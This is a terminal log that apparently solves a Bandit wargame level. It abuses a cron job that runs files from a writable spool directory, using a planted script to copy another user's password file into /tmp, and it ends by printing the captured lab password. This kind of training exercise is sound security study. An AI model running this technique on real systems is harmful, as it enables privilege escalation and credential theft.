

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24.sh
cat: /etc/cron.d/cronjob_bandit24.sh: No such file or directory

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/qwer

bandit23@bandit:~$ vim /tmp/qwer/sc.sh
          `#!/bin/bash

          cat /etc/bandit_pass/bandit24 > /tmp/qwer/p`




bandit23@bandit:~$ chmod 777 /tmp/qwer/sc.sh

bandit23@bandit:~$ chmod 777 /tmp/qwer

bandit23@bandit:~$ touch /tmp/qwer/p && chmod 777 /tmp/qwer/p

bandit23@bandit:~$ cp /tmp/qwer/sc.sh /var/spool/bandit24/foo/

bandit23@bandit:~$ cat /tmp/qwer/p
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
